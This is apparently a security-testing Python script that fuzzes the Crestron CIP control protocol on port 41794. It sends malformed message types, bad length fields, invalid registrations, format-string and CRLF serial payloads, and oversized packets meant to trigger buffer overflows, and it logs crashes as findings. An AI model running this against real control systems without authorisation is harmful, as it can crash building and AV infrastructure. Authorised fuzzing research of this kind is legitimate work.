#!/usr/bin/env python3
"""
Crestron CIP Protocol Fuzzer
Phase 3: Fuzz the CIP binary protocol on port 41794/TCP

Targets CPHProcessor/libCrestronProtocolHandler.so
- CPHProcessor has NO FORTIFY protection
- CIP uses binary framing: type(1) | length(2 BE) | payload(length)

Fuzzing strategies:
1. Message type fuzzing (all 256 possible types)
2. Length field manipulation (underflow, overflow, zero, max)
3. Payload content fuzzing for known message types
4. Registration with invalid/boundary IP IDs
5. Heartbeat manipulation
6. Join value fuzzing (digital, analog, serial)
7. Oversized payloads targeting buffer overflows
"""

import sys
import os
import socket
import struct
import time
import random

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from crestron_common import CIPClient, EvidenceCollector


class CIPFuzzer:
    """CIP protocol fuzzer for binary protocol testing."""

    def __init__(self, host, port=41794, timeout=5):
        self.host = host
        self.port = port
        self.timeout = timeout
        self.ec = EvidenceCollector("cip_fuzzer")
        self.crash_count = 0

    def _connect(self):
        """Create a fresh TCP connection."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        sock.connect((self.host, self.port))
        return sock

    def _send_recv(self, sock, data, wait=0.5):
        """Send data and receive response."""
        try:
            sock.send(data)
            time.sleep(wait)
            sock.setblocking(False)
            resp = b""
            try:
                while True:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    resp += chunk
            except (BlockingIOError, socket.error):
                pass
            finally:
                sock.setblocking(True)
                sock.settimeout(self.timeout)
            return resp
        except (ConnectionResetError, BrokenPipeError):
            return b"CONNECTION_RESET"
        except socket.timeout:
            return b"TIMEOUT"
        except Exception as e:
            return f"ERROR:{e}".encode()

    def _check_alive(self):
        """Check if the service is still responding."""
        try:
            sock = self._connect()
            time.sleep(0.5)
            resp = self._send_recv(sock, b'\x14', wait=1)
            sock.close()
            return len(resp) > 0 and resp != b"CONNECTION_RESET"
        except:
            return False

    def fuzz_message_types(self):
        """Fuzz all 256 possible message type bytes."""
        print("\n[*] Fuzzing CIP message types (0x00-0xFF)")
        print("    Each type sent with zero-length payload")

        for msg_type in range(256):
            test_id = f"FUZZ-TYPE-{msg_type:02X}"
            # Message: type | 0x00 0x00 (zero length)
            packet = bytes([msg_type, 0x00, 0x00])

            try:
                sock = self._connect()
                time.sleep(0.3)
                resp = self._send_recv(sock, packet, wait=0.5)

                status = "INFO"
                if resp == b"CONNECTION_RESET":
                    status = "ANOMALY"
                    self.ec.add_anomaly(test_id, f"Connection reset on type 0x{msg_type:02X}")
                    print(f"  [!] Type 0x{msg_type:02X}: CONNECTION RESET")
                elif len(resp) > 0:
                    print(f"  [+] Type 0x{msg_type:02X}: {len(resp)} bytes response")
                else:
                    pass  # No response, expected for unknown types

                self.ec.add_test(test_id, f"CIP message type 0x{msg_type:02X}",
                               packet.hex(), resp.hex() if isinstance(resp, bytes) else resp,
                               status=status)
                sock.close()
            except ConnectionRefusedError:
                print(f"  [!!!] Service DOWN after type 0x{msg_type:02X}!")
                self.crash_count += 1
                self.ec.add_finding(test_id, "CRITICAL",
                                  f"CIP service crash on message type 0x{msg_type:02X}",
                                  f"Packet: {packet.hex()}")
                time.sleep(2)  # Wait for potential restart
            except Exception as e:
                self.ec.add_test(test_id, f"CIP type 0x{msg_type:02X}", packet.hex(),
                               f"ERROR: {e}", status="ERROR")

    def fuzz_length_fields(self):
        """Fuzz length field with boundary values."""
        print("\n[*] Fuzzing CIP length fields")

        # Known message types to test with
        test_types = [0x01, 0x02, 0x03, 0x05, 0x0D, 0x0E, 0x0F, 0x14]

        # Length values to test
        length_values = [
            (0, "zero"),
            (1, "one"),
            (3, "minimum_valid"),
            (7, "typical_register"),
            (255, "max_single_byte"),
            (256, "boundary_256"),
            (1024, "1KB"),
            (4096, "4KB"),
            (8192, "8KB"),
            (65535, "max_16bit"),
        ]

        for msg_type in test_types:
            for length, name in length_values:
                test_id = f"FUZZ-LEN-{msg_type:02X}-{name}"

                # Build packet with specified length but minimal actual payload
                len_high = (length >> 8) & 0xFF
                len_low = length & 0xFF
                header = bytes([msg_type, len_high, len_low])

                # Send LESS data than advertised (length underflow)
                # This tests if the server handles partial reads correctly
                actual_payload = b'\x00' * min(length, 16)  # Only send up to 16 bytes
                packet = header + actual_payload

                try:
                    sock = self._connect()
                    time.sleep(0.3)
                    resp = self._send_recv(sock, packet, wait=1.0)

                    status = "INFO"
                    if resp == b"CONNECTION_RESET":
                        status = "ANOMALY"
                        self.ec.add_anomaly(test_id, f"Reset: type=0x{msg_type:02X} len={length}")
                        print(f"  [!] Type 0x{msg_type:02X} len={length} ({name}): RESET")
                    elif len(resp) > 0:
                        print(f"  [+] Type 0x{msg_type:02X} len={length} ({name}): {len(resp)}B resp")

                    self.ec.add_test(test_id, f"Length {name} for type 0x{msg_type:02X}",
                                   packet.hex()[:60], resp.hex()[:60] if isinstance(resp, bytes) else resp,
                                   status=status)
                    sock.close()
                except ConnectionRefusedError:
                    print(f"  [!!!] Service DOWN: type 0x{msg_type:02X} len={length}")
                    self.crash_count += 1
                    self.ec.add_finding(test_id, "CRITICAL",
                                      f"CIP crash: type 0x{msg_type:02X} length={length}",
                                      f"Packet: {packet.hex()[:120]}")
                    time.sleep(2)
                except Exception as e:
                    pass

    def fuzz_registration(self):
        """Fuzz IP ID registration with various values."""
        print("\n[*] Fuzzing CIP IP ID registration")

        # Standard registration: 0x01 0x00 0x07 0x7F 0x00 0x00 0x01 0x00 <IPID> 0x40
        ipid_values = list(range(0, 256, 16)) + [0x00, 0x01, 0x02, 0x03, 0xFE, 0xFF]

        for ipid in sorted(set(ipid_values)):
            test_id = f"FUZZ-REG-{ipid:02X}"
            payload = bytes([0x7F, 0x00, 0x00, 0x01, 0x00, ipid, 0x40])
            packet = bytes([0x01, 0x00, len(payload)]) + payload

            try:
                sock = self._connect()
                time.sleep(0.3)
                resp = self._send_recv(sock, packet, wait=1.0)

                if resp and len(resp) >= 3:
                    resp_type = resp[0]
                    if resp_type == 0x02:
                        resp_len = (resp[1] << 8) | resp[2]
                        resp_payload = resp[3:3+resp_len] if resp_len > 0 else b""
                        if resp_len == 4:
                            print(f"  [+] IP ID 0x{ipid:02X}: REGISTERED")
                        elif resp_payload == b'\xff\xff\x02':
                            print(f"  [-] IP ID 0x{ipid:02X}: rejected (not defined)")
                        else:
                            print(f"  [?] IP ID 0x{ipid:02X}: resp={resp.hex()[:30]}")
                    else:
                        print(f"  [?] IP ID 0x{ipid:02X}: type=0x{resp_type:02X}")

                self.ec.add_test(test_id, f"Register IP ID 0x{ipid:02X}",
                               packet.hex(), resp.hex() if isinstance(resp, bytes) else str(resp))
                sock.close()
            except Exception as e:
                self.ec.add_test(test_id, f"Register IP ID 0x{ipid:02X}",
                               packet.hex(), f"ERROR: {e}", status="ERROR")

        # Malformed registration packets
        print("\n  Testing malformed registration packets...")
        malformed = [
            ("REG-MAL-001", bytes([0x01, 0x00, 0x00]), "Zero-length register"),
            ("REG-MAL-002", bytes([0x01, 0x00, 0x01, 0x00]), "Truncated register"),
            ("REG-MAL-003", bytes([0x01, 0x00, 0x07]) + b'\xFF' * 7, "All-FF payload register"),
            ("REG-MAL-004", bytes([0x01, 0x00, 0xFF]) + b'\x41' * 255, "Oversized register"),
            ("REG-MAL-005", bytes([0x01, 0xFF, 0xFF]) + b'\x00' * 100, "Max-length register (short payload)"),
        ]

        for test_id, packet, desc in malformed:
            try:
                sock = self._connect()
                time.sleep(0.3)
                resp = self._send_recv(sock, packet, wait=1.0)
                status = "ANOMALY" if resp == b"CONNECTION_RESET" else "INFO"
                if resp == b"CONNECTION_RESET":
                    print(f"  [!] {desc}: CONNECTION RESET")
                self.ec.add_test(test_id, desc, packet.hex(),
                               resp.hex() if isinstance(resp, bytes) else str(resp), status=status)
                sock.close()
            except ConnectionRefusedError:
                self.crash_count += 1
                self.ec.add_finding(test_id, "CRITICAL", f"CIP crash: {desc}", f"Packet: {packet.hex()}")
                print(f"  [!!!] CRASH: {desc}")
                time.sleep(2)
            except:
                pass

    def fuzz_serial_joins(self):
        """Fuzz serial join payloads (string data)."""
        print("\n[*] Fuzzing CIP serial join payloads")

        # First register an IP ID
        try:
            sock = self._connect()
            time.sleep(0.5)
            reg_payload = bytes([0x7F, 0x00, 0x00, 0x01, 0x00, 0x03, 0x40])
            sock.send(bytes([0x01, 0x00, len(reg_payload)]) + reg_payload)
            time.sleep(1)
            resp = sock.recv(4096)

            # Send crafted serial joins with injection payloads
            injections = [
                ("SER-001", "#1,A" * 100, "Long repeated string"),
                ("SER-002", "#1," + "A" * 4096, "4KB serial payload"),
                ("SER-003", "#1," + "\x00" * 256, "Null-filled serial"),
                ("SER-004", "#1," + "%n%n%n%n%n", "Format string test"),
                ("SER-005", "#1," + "%s" * 50, "Format string %s"),
                ("SER-006", "#1," + "\xff" * 256, "High-byte serial"),
                ("SER-007", "#99999," + "test", "Out-of-range join number"),
                ("SER-008", "#-1," + "test", "Negative join number"),
                ("SER-009", "#1," + "A\r\nB\r\nC\r\n" * 50, "CRLF injection"),
            ]

            for test_id, serial_data, desc in injections:
                join_payload = (serial_data + "\r").encode('ascii', errors='replace')
                cip_payload = bytes([0x00, 0x00, len(join_payload) + 1, 0x02]) + join_payload
                packet = bytes([0x05, (len(cip_payload) >> 8) & 0xFF, len(cip_payload) & 0xFF]) + cip_payload

                try:
                    resp = self._send_recv(sock, packet, wait=0.5)
                    status = "ANOMALY" if resp == b"CONNECTION_RESET" else "INFO"
                    if resp == b"CONNECTION_RESET":
                        print(f"  [!] {test_id} {desc}: RESET")
                        self.ec.add_anomaly(test_id, f"Serial join reset: {desc}")
                    self.ec.add_test(test_id, desc, packet.hex()[:60],
                                   resp.hex()[:60] if isinstance(resp, bytes) else str(resp), status=status)
                except:
                    pass

            sock.close()
        except Exception as e:
            print(f"  [-] Serial join fuzzing error: {e}")

    def fuzz_oversized_packets(self):
        """Send oversized packets targeting buffer overflows."""
        print("\n[*] Fuzzing with oversized packets")

        sizes = [256, 512, 1024, 2048, 4096, 8192, 16384, 32768, 65535]

        for size in sizes:
            test_id = f"FUZZ-SIZE-{size}"
            # Type 0x05 (data) with oversized payload
            payload = b'\x41' * size
            len_bytes = struct.pack('>H', min(size, 65535))
            packet = bytes([0x05]) + len_bytes + payload

            try:
                sock = self._connect()
                time.sleep(0.3)
                resp = self._send_recv(sock, packet, wait=1.0)

                status = "INFO"
                if resp == b"CONNECTION_RESET":
                    status = "ANOMALY"
                    print(f"  [!] Size {size}: CONNECTION RESET")
                elif not self._check_alive():
                    status = "CRITICAL"
                    self.crash_count += 1
                    self.ec.add_finding(test_id, "CRITICAL",
                                      f"CIP service crash with {size}-byte payload",
                                      f"Type: 0x05, Payload: {size} bytes of 0x41")
                    print(f"  [!!!] Size {size}: SERVICE CRASHED!")
                else:
                    print(f"  [+] Size {size}: handled OK")

                self.ec.add_test(test_id, f"Oversized packet ({size} bytes)",
                               f"0x05 + {size} bytes", str(status), status=status)
                sock.close()
            except ConnectionRefusedError:
                self.crash_count += 1
                print(f"  [!!!] Size {size}: SERVICE DOWN!")
                self.ec.add_finding(test_id, "CRITICAL",
                                  f"CIP crash: {size}-byte packet", "Service unreachable")
                time.sleep(3)
            except:
                pass

    def run_all(self):
        """Run all fuzzing campaigns."""
        print("=" * 60)
        print(f"CIP Protocol Fuzzer - Target: {self.host}:{self.port}")
        print("=" * 60)

        # Verify service is up
        if not self._check_alive():
            print("[-] Target service is not responding. Aborting.")
            return

        self.fuzz_message_types()
        self.fuzz_length_fields()
        self.fuzz_registration()
        self.fuzz_serial_joins()
        self.fuzz_oversized_packets()

        print(f"\n[*] Fuzzing complete. Crashes detected: {self.crash_count}")
        self.ec.save()


if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_host> [port]")
        print()
        print("Fuzzes the Crestron CIP binary protocol on port 41794/TCP")
        print("Targets CPHProcessor (no FORTIFY protection)")
        sys.exit(1)

    target = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 41794

    fuzzer = CIPFuzzer(target, port)
    fuzzer.run_all()
